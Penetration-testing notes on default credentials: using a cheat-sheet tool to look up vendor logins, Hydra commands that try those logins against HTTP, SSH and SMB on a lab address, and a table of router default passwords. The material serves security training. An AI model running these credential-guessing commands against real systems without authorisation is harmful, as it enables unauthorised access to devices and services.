Many systems—such as **routers, firewalls, web applications, databases, and network devices**—ship with **default credentials**. If administrators fail to change them during deployment, these credentials become a **high-impact, low-effort attack vector**.

Default credentials are especially common in:

- Network appliances (routers, switches, firewalls)
    
- Embedded devices (IoT, printers, cameras)
    
- Web admin panels
    
- Databases and middleware
    
- Test and staging environments
    

---

## Default Credentials Cheat Sheet Tool

A commonly used tool is **defaultcreds-cheat-sheet**, which aggregates known default credentials.

### Installation

```bash
uv add defaultcreds-cheat-sheet
```

### Searching for Default Credentials

```bash
uv run creds search <vendor_or_product>
```

Example:

```bash
uv run creds search linksys
```

Output example:

```
+---------------+---------------+------------+
| Product       | username      | password   |
+---------------+---------------+------------+
| linksys       | <blank>       | <blank>    |
| linksys       | <blank>       | admin      |
| linksys       | admin         | admin      |
| linksys (ssh) | admin         | password   |
| linksys (ssh) | root          | admin      |
+---------------+---------------+------------+
```

**Notes:**

- `<blank>` means an empty username or password
    
- Entries may differ by protocol (HTTP, SSH, Telnet)
    
- Always verify the exposed service first
    

---

## Using Default Credentials in Attacks

Once default credentials are identified, they can be tested manually or automated using tools like **Hydra**.

### Formatting Credentials for Hydra

Create a file in `username:password` format:

```bash
admin:admin
admin:password
root:admin
```

Save as:

```bash
defaults.txt
```

---

## Testing Default Credentials with Hydra

### Example: HTTP Basic Authentication

```bash
hydra -C defaults.txt http-get://10.10.10.10
```

### Example: SSH

```bash
hydra -C defaults.txt ssh://10.10.10.10
```

### Example: SMB

```bash
hydra -C defaults.txt smb://10.10.10.10
```

**Tip:** Default credentials usually require **very low concurrency** to avoid lockouts:

```bash
-t 1
```

---

## Default Credentials in Routers

Routers are a frequent target, especially in:

- Internal networks
    
- Lab environments
    
- Legacy infrastructure
    
- Misconfigured deployments
    

### Common Router Defaults

|Vendor|Default IP|Username|Password|
|---|---|---|---|
|3Com|[http://192.168.1.1](http://192.168.1.1)|admin|Admin|
|Belkin|[http://192.168.2.1](http://192.168.2.1)|admin|admin|
|BenQ|[http://192.168.1.1](http://192.168.1.1)|admin|Admin|
|D-Link|[http://192.168.0.1](http://192.168.0.1)|admin|Admin|
|Digicom|[http://192.168.1.254](http://192.168.1.254)|admin|Michelangelo|
|Linksys|[http://192.168.1.1](http://192.168.1.1)|admin|Admin|
|Netgear|[http://192.168.0.1](http://192.168.0.1)|admin|password|
